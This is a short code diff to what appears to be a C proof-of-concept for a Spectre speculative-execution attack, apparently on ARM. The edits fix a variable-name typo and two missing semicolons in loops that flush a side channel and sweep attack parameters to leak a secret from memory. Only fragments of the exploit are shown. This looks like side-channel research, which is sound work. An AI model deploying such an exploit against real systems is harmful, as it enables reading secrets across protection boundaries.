@@ -67,7 +67,7 @@ void spectre(size_t offset){
 		flushSideChannel();
 		training_x = trial_idx % buffer_size;
 
-		for (j = 1; j <= period * attack_time; j++) {
+		for (j = 1; j <= period * attack_times; j++) {
 			flush(&buffer_size);
 			for (volatile int z = 0; z < 100; z++){}
 			//asm volatile("DSB SY");
@@ -111,13 +111,13 @@ int main(int argc, const char**argv){
   asm volatile ("DSB SY");
 
   size_t secret_offset = (size_t)(secret - (char*)buffer);
-  printf("Fixed period = 6\n")
+  printf("Fixed period = 6\n");
   period = 6;
   for(int i=1; i<=10; i++){ // length of secret is known
     attack_times = i;
     spectre(secret_offset);
   }
-  printf("Fixed Attack_times = 5\n")
+  printf("Fixed Attack_times = 5\n");
   attack_times = 5;
   for(int i=2; i<=11; i++){ // length of secret is known
     period = i;
